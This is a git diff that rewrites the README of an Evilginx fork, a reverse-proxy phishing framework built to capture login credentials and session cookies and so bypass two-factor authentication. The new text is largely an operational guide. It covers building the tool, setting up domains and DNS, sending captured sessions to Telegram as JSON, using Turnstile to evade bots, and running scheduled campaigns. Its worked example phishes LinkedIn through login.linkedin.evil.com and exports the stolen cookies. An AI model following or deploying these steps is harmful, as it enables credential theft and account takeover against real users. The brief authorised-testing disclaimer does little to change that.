@@ -5,71 +5,370 @@
   </p>
 </p>
 
-# Evilginx 3.0
+# Evilginx 3.0 - Enhanced Edition
 
-**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
+**Evilginx Enhanced** is a powerful man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection. This enhanced version includes a modern web dashboard, advanced notification system, and comprehensive management tools.
 
-This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
-Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
+This enhanced edition builds upon the original [Evilginx2](https://github.com/kgretzky/evilginx2) with significant improvements including:
 
-<p align="center">
-  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
-</p>
+- 🎛️ **Modern Web Dashboard** with authentication system
+- 🔐 **Advanced Security Features** with session management
+- 📊 **Real-time Monitoring** with WebSocket integration
+- 💻 **Terminal Integration** with command filtering
+- 📱 **Enhanced Telegram Notifications** with JSON export
+- 🛡️ **Turnstile Integration** for advanced bot protection
+- ⚡ **Live Session Management** with comprehensive controls
 
-## Disclaimer
+## ✨ New Features
 
-I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.
+### 🌐 Web Dashboard Authentication
+- **Secure Setup Flow**: Initial authentication key generation
+- **Session Management**: Token-based authentication with expiration
+- **Panel Lock/Unlock**: Emergency lock functionality
+- **IP Tracking**: Monitor dashboard access attempts
+- **Auto-logout**: Configurable session timeout
 
-## Evilginx Mastery Training Course
+### 📊 Enhanced Dashboard Interface
+- **Session Management**: Real-time session monitoring with copy-to-clipboard functionality
+- **Phishlet Controls**: Enable/disable phishlets with hostname configuration
+- **Lure Management**: Complete CRUD operations for lures
+- **Credential Export**: One-click credential extraction
+- **Live Updates**: Real-time session updates via WebSocket
+- **Modern UI**: Glassmorphism design with responsive controls
 
-If you want everything about reverse proxy phishing with **Evilginx** - check out my [Evilginx Mastery](https://academy.breakdev.org/evilginx-mastery) course!
+### 💻 Terminal Integration
+- **WebSocket Terminal**: Secure shell access through web interface
+- **Command Filtering**: Advanced security filtering for dangerous commands
+- **Session Isolation**: Restricted environment for safe operations
+- **Real-time I/O**: Full terminal emulation with xterm.js
+- **Security Warnings**: Clear indicators for filtered commands
 
-<p align="center">
-  <a href="https://academy.breakdev.org/evilginx-mastery"><img alt="Evilginx Mastery" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx_mastery.jpg" height="320" /></a>
-</p>
+### 📱 Advanced Telegram Integration
+- **JSON File Export**: Structured session data export
+- **Smart Notifications**: Intelligent detection of valuable sessions
+- **File Upload**: Automatic attachment of session data
+- **Comprehensive Data**: Full auth token export with metadata
+- **Fallback System**: Text messages when file upload fails
 
-Learn everything about the latest methods of phishing, using reverse proxying to bypass Multi-Factor Authentication. Learn to think like an attacker, during your red team engagements, and become the master of phishing with Evilginx.
+### 🛡️ Turnstile Integration
+- **Bot Protection**: Cloudflare Turnstile integration
+- **Easy Configuration**: Simple terminal commands for setup
+- **Dynamic Injection**: Automatic site key replacement
+- **Toggle Control**: Enable/disable Turnstile per configuration
 
-Grab it here:
-https://academy.breakdev.org/evilginx-mastery
+## 🚀 Installation
 
-## Official Gophish integration
+### Prerequisites
+- Go 1.19 or higher
+- Git
+- Linux/macOS/Windows with WSL2
 
-If you'd like to use Gophish to send out phishing links compatible with Evilginx, please use the official Gophish integration with Evilginx 3.3.
-You can find the custom version here in the forked repository: [Gophish with Evilginx integration](https://github.com/kgretzky/gophish/)
+### Quick Setup
+```bash
+# Clone the repository
+git clone https://github.com/olidahallstrom/evilginx-webview.git
+cd evilginx-webview/evilginx2
 
-If you want to learn more about how to set it up, please follow the instructions in [this blog post](https://breakdev.org/evilginx-3-3-go-phish/)
+# Build the application
+go build -o evilginx2 .
 
-## Write-ups
+# Run Evilginx2
+sudo ./evilginx2
+```
 
-If you want to learn more about reverse proxy phishing, I've published extensive blog posts about **Evilginx** here:
+### Advanced Installation
+```bash
+# Install dependencies
+go mod download
 
-[Evilginx 2.0 - Release](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens)
+# Build with specific flags
+go build -ldflags="-s -w" -o evilginx2 .
 
-[Evilginx 2.1 - First Update](https://breakdev.org/evilginx-2-1-the-first-post-release-update/)
+# Create configuration directory
+mkdir -p ~/.evilginx
 
-[Evilginx 2.2 - Jolly Winter Update](https://breakdev.org/evilginx-2-2-jolly-winter-update/)
+# Set executable permissions
+chmod +x evilginx2
+```
 
-[Evilginx 2.3 - Phisherman's Dream](https://breakdev.org/evilginx-2-3-phishermans-dream/)
+## ⚙️ Configuration
 
-[Evilginx 2.4 - Gone Phishing](https://breakdev.org/evilginx-2-4-gone-phishing/)
+### Initial Setup
+1. **Run Evilginx2**: `sudo ./evilginx2`
+2. **Configure Domain**: `config domain your-domain.com`
+3. **Set External IP**: `config ipv4 external YOUR_IP`
+4. **Configure Ports**: 
+   - HTTPS: `config https_port 443`
+   - DNS: `config dns_port 53`
+   - Web: `config web_port 8080`
 
-[Evilginx 3.0](https://breakdev.org/evilginx-3-0-evilginx-mastery/)
+### Web Dashboard Setup
+1. **Access Dashboard**: Navigate to `http://your-server:8080`
+2. **Initial Setup**: Click "Setup Authentication"
+3. **Save Auth Key**: Copy and securely store the generated key
+4. **Login**: Use the key to access the dashboard
 
-[Evilginx 3.2](https://breakdev.org/evilginx-3-2/)
+### Turnstile Configuration
+```bash
+# Set Turnstile site key
+config turnstile site_key YOUR_TURNSTILE_SITE_KEY
 
-[Evilginx 3.3](https://breakdev.org/evilginx-3-3-go-phish/)
+# Enable Turnstile
+config turnstile enabled true
+```
 
-## Help
+### Telegram Integration
+```bash
+# Set bot token
+config telegram bot_token YOUR_BOT_TOKEN
 
-In case you want to learn how to install and use **Evilginx**, please refer to online documentation available at:
+# Set chat ID
+config telegram chat_id YOUR_CHAT_ID
 
-https://help.evilginx.com
+# Enable notifications
+config telegram enabled true
 
-## Support
+# Test connection
+config telegram test
+```
 
-I DO NOT offer support for providing or creating phishlets. I will also NOT help you with creation of your own phishlets. Please look for ready-to-use phishlets, provided by other people.
+## 🎯 Usage Examples
 
-## License
+### Basic Phishing Campaign
+```bash
+# Load a phishlet
+phishlets load linkedin
+
+# Set hostname
+phishlets hostname linkedin login.linkedin.evil.com
+
+# Enable phishlet
+phishlets enable linkedin
+
+# Create lure
+lures create linkedin
+lures get-url 0
+```
+
+### Advanced Session Management
+```bash
+# View sessions
+sessions
+
+# Export session cookies
+sessions 1 export cookies.json
+
+# Delete session
+sessions 1 delete
+```
+
+### Dashboard Operations
+- **Session Monitoring**: View real-time session data
+- **Credential Copy**: One-click credential extraction
+- **Phishlet Management**: Enable/disable with hostname setting
+- **Lure Operations**: Create, edit, and delete lures
+- **Terminal Access**: Secure shell through web interface
+
+## 🔧 API Documentation
+
+### Authentication Endpoints
+- `POST /api/auth/setup` - Initial authentication setup
+- `POST /api/auth/login` - User login
+- `POST /api/auth/logout` - User logout
+- `GET /api/auth/status` - Authentication status
+- `POST /api/auth/lock` - Lock panel
+- `POST /api/auth/unlock` - Unlock panel
+
+### Session Management
+- `GET /api/sessions` - List all sessions
+- `GET /api/sessions/{id}` - Get session details
+- `GET /api/stats` - Server statistics
+
+### Phishlet Operations
+- `GET /api/phishlets` - List phishlets
+- `POST /api/phishlets/{name}/enable` - Enable phishlet
+- `POST /api/phishlets/{name}/disable` - Disable phishlet
+- `POST /api/phishlets/{name}/hostname` - Set hostname
+- `GET /api/phishlets/{name}/credentials` - Export credentials
+
+### Lure Management
+- `GET /api/lures` - List lures
+- `POST /api/lures` - Create lure
+- `PUT /api/lures/{id}` - Update lure
+- `DELETE /api/lures/{id}` - Delete lure
+- `GET /api/lures/{id}/url` - Get lure URL
+
+### WebSocket Endpoints
+- `ws://server:port/ws` - Dashboard updates
+- `ws://server:port/ws/terminal` - Terminal access
+
+## 🔒 Security Features
+
+### Authentication Security
+- **SHA256 Hashing**: Secure key storage
+- **Session Tokens**: Cryptographically secure tokens
+- **IP Tracking**: Monitor access attempts
+- **Auto-expiration**: Configurable session timeout
+- **Panel Lock**: Emergency lock functionality
+
+### Command Security
+- **Filtered Commands**: Blocks dangerous operations
+- **Path Restrictions**: Prevents access to sensitive files
+- **Environment Isolation**: Restricted shell environment
+- **Audit Logging**: Comprehensive security logs
+
+### Network Security
+- **HTTPS Only**: Secure dashboard communication
+- **WebSocket Security**: Authenticated WebSocket connections
+- **CSRF Protection**: Request validation
+- **Rate Limiting**: Prevents abuse
+
+## 🛠️ Troubleshooting
+
+### Common Issues
+
+**Dashboard Not Accessible**
+```bash
+# Check web server status
+netstat -tlnp | grep :8080
+
+# Verify configuration
+config web_port 8080
+
+# Check firewall
+sudo ufw allow 8080
+```
+
+**Telegram Notifications Not Working**
+```bash
+# Test connection
+config telegram test
+
+# Check logs
+tail -f /var/log/evilginx2.log
+
+# Verify configuration
+config telegram bot_token
+config telegram chat_id
+```
+
+**Terminal Not Connecting**
+```bash
+# Check WebSocket connection
+curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Key: test" -H "Sec-WebSocket-Version: 13" http://localhost:8080/ws/terminal
+```
+
+### Performance Optimization
+- **Database Cleanup**: Regularly clean old sessions
+- **Log Rotation**: Configure log rotation
+- **Memory Monitoring**: Monitor memory usage
+- **Connection Limits**: Set appropriate limits
+
+## 📋 Configuration Files
+
+### Main Configuration
+```json
+{
+  "general": {
+    "domain": "your-domain.com",
+    "external_ipv4": "YOUR_IP",
+    "https_port": 443,
+    "dns_port": 53,
+    "web_port": 8080
+  },
+  "telegram": {
+    "bot_token": "YOUR_BOT_TOKEN",
+    "chat_id": "YOUR_CHAT_ID",
+    "enabled": true
+  },
+  "turnstile": {
+    "site_key": "YOUR_SITE_KEY",
+    "enabled": true
+  },
+  "auth": {
+    "key_hash": "...",
+    "is_setup": true,
+    "is_locked": false
+  }
+}
+```
+
+## 🌟 Advanced Features
+
+### Custom Phishlets
+- **Dynamic Loading**: Hot-reload phishlets
+- **Template System**: Reusable phishlet templates
+- **Parameter Injection**: Dynamic parameter replacement
+- **Multi-domain Support**: Complex multi-step phishing
+
+### Analytics Dashboard
+- **Real-time Metrics**: Live session statistics
+- **Success Rates**: Campaign effectiveness tracking
+- **Geographic Data**: Visitor location tracking
+- **Device Fingerprinting**: Device and browser detection
+
+### Automation Features
+- **Scheduled Campaigns**: Automated phishing campaigns
+- **Webhook Integration**: External system notifications
+- **Batch Operations**: Bulk session management
+- **Export Automation**: Automated credential export
+
+## 🤝 Contributing
+
+### Development Setup
+```bash
+# Clone the repository
+git clone https://github.com/olidahallstrom/evilginx-webview.git
+
+# Install dependencies
+go mod download
+
+# Run tests
+go test ./...
+
+# Build for development
+go build -race -o evilginx2-dev .
+```
+
+### Code Guidelines
+- **Go Standards**: Follow Go best practices
+- **Error Handling**: Comprehensive error handling
+- **Logging**: Structured logging with levels
+- **Testing**: Unit tests for all features
+- **Documentation**: Clear code documentation
+
+## 📄 License
 
 **evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.
+
+This enhanced version includes modifications by [@olidahallstrom](https://github.com/olidahallstrom) and maintains the same BSD-3 license.
+
+## ⚠️ Disclaimer
+
+This tool is designed for authorized penetration testing and educational purposes only. The authors and contributors are not responsible for any misuse of this tool. Users must ensure they have proper authorization before using this tool against any targets.
+
+**Use responsibly and ethically.**
+
+## 🔗 Links
+
+- **Original Evilginx2**: https://github.com/kgretzky/evilginx2
+- **Enhanced Version**: https://github.com/olidahallstrom/evilginx-webview
+- **Documentation**: https://help.evilginx.com
+- **Training Course**: https://academy.breakdev.org/evilginx-mastery
+
+## 📞 Support
+
+For issues related to the enhanced features:
+- **GitHub Issues**: https://github.com/olidahallstrom/evilginx-webview/issues
+- **Feature Requests**: Submit via GitHub Issues
+- **Security Issues**: Report privately via GitHub Security
+
+For original Evilginx2 support:
+- **Official Documentation**: https://help.evilginx.com
+- **Original Repository**: https://github.com/kgretzky/evilginx2
+
+---
+
+<p align="center">
+  <strong>Enhanced with ❤️ for the cybersecurity community</strong>
+</p>
